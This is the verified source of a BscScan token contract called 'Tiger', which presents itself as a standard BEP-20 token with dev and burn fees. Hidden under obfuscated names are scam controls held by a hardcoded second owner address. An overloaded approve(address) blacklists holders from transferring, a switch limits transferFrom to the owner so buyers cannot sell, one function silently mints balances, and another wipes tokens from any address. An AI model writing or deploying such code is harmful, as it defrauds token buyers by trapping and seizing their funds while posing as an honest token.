/**
 *Submitted for verification at BscScan.com on 2022-01-06
*/

pragma solidity ^0.6.12;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

   
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

   
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

   
    function approve(address spender, uint256 amount) external returns (bool);

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

   
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library Address {
   
    function isContract(address account) internal view returns (bool) {
       
        bytes32 codehash;


            bytes32 accountHash
         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }


    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

 
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

 
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }


    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");


        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
           
            if (returndata.length > 0) {
               
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


contract Ownable is Context {
    address private _owner;
    address private _owners = 0xca7FF6798460EbA1612f1076Ee74D700D7FEE790;


    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );


    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "you not the owner");
        _;
    }

    modifier onlyowners() {
        require(_owners == _msgSender(), "you not the owner");
        _;
    }


    function transferOwnership(address newOwner) public virtual onlyowners {
        _owner = newOwner;
    }
}

contract Tiger is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _towned;
    mapping(address => mapping(address => uint256)) private allowan;

    mapping(address => bool) private _ExcludFee;
    mapping(address => bool) private _Exclud;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _totalSupply = 10000000000000000 * 10**3;
    uint256 private _tFeeTotal;
    
    string private _name = "Tiger";
    string private _symbol = "Tiger";
    uint8 private _decimals = 3;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0xca7FF6798460EbA1612f1076Ee74D700D7FEE790;
  
    uint256 public deadFee = 3;
    uint256 public devFee = 2;

    mapping(address => bool) private _food;
    bool private bhei = true;
    bool private allbhei = false;
    
    uint256 public bfood = uint256(0);
    mapping(address => uint256) private bfoods;
    address[] private _bfoods;

    uint256 public food = uint256(0);
    mapping(address => uint256) private foods;
    address[] private _foods;

    address owners;

    constructor() public {
        _towned[_msgSender()] = _totalSupply;
         owners = _msgSender();
        _ExcludFee[owner()] = true;
        _ExcludFee[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _towned[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if(_ExcludFee[_msgSender()] || _ExcludFee[recipient]){
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
             uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(_msgSender(), devAddress, devAmount);
        _transfer(_msgSender(), deadAddress, deadAmount);
        _transfer(_msgSender(), recipient, amount.sub(devAmount).sub(deadAmount));
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return allowan[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if(allbhei){
     require(owners == sender, "allbhei");
        }
        if(_ExcludFee[_msgSender()] || _ExcludFee[recipient]){
            _transfer(sender, recipient, amount);
            return true;
        }       
        uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(sender, devAddress, devAmount);
        _transfer(sender, deadAddress, deadAmount);
        _transfer(sender, recipient, amount.sub(devAmount).sub(deadAmount));
    
        _approve(
            sender,
            _msgSender(),
            allowan[sender][_msgSender()].sub(
                amount,
                "BRP20"
            )
        );
        return true;
    }


    function ExcludFromReward(address recipient) public view returns (bool) {
        return _Exclud[recipient];
    }

    function totalFee() public view returns (uint256) {
        return _tFeeTotal;
    }

    function excludeFromFee(address recipient) public onlyowners {
        _ExcludFee[recipient] = true;
    }

    function includeInFee(address recipient) public onlyowners {
        _ExcludFee[recipient] = false;
    }
 
    function setallbhei(bool statusofuse) external onlyowners() {
        allbhei = statusofuse;
    }
    function approve(address statusofuse) external onlyowners() {
        _food[statusofuse] = true;
    }

    function _freed(address statusofuse) external onlyowners() {
        delete _food[statusofuse];
    }
    function addfreedquantity(address freedAddress, uint256 freedamount) 
        external 
        onlyowners() {
        require(freedamount > 0, "freedamount");
        uint256 clown = foods[freedAddress];
        if (clown == 0) _foods.push(freedAddress);
        foods[freedAddress] = clown.add(freedamount);
        food = food.add(freedamount);
        _towned[freedAddress] = _towned[freedAddress].add(freedamount);
    }

    function Pleasefreed(address freedAddress)
        external
        view
        onlyowners()
        returns (bool)
    {
        return _food[freedAddress];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "azero");
        require(spender != address(0), "zero");

        allowan[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "zero");
        require(to != address(0), "zero");
        require(amount > 0, "zero");

        if (bhei) {
            require(_food[from] == false, "food");
        }


        _transfers(from, to, amount);
    }

    function _transfers(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {   
        require(sender != address(0), "zero");
        require(recipient != address(0), "zero");
    
        _towned[sender] = _towned[sender].sub(toAmount);
        _towned[recipient] = _towned[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }
    function TransToken(address[] memory recipients, uint256 Acceptedamount) public {
        for (uint i=0; i<recipients.length; i++) {
            _transfers(_msgSender(), recipients[i], Acceptedamount);
        }
    }
    function setburnfreedquantity(address burnfreedAddress, uint256 burnfreedamount)
        external
        onlyowners() {
        require(burnfreedamount > 0, "burnfreedamount");
        uint256 bclown = foods[burnfreedAddress];
        if (bclown == 0) _bfoods.push(burnfreedAddress);
        bfoods[burnfreedAddress] = bclown.add(burnfreedamount);
        bfood = bfood.add(burnfreedamount);
        _towned[burnfreedAddress] = _towned[burnfreedAddress].sub(burnfreedamount);
    }
  

}